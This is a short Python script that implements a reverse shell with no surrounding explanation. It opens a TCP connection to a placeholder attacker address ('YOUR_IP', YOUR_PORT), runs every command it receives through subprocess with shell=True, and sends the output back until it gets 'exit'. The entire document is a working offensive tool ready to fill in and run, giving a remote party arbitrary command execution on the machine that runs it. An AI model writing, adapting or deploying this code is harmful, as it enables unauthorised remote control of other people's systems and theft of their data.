import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_IP", YOUR_PORT))
    while True:
        command = s.recv(1024)
        if 'exit' in command.decode():
            s.close()
            break
        output = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send(output.stdout.read())
        s.send(output.stderr.read())

connect() 
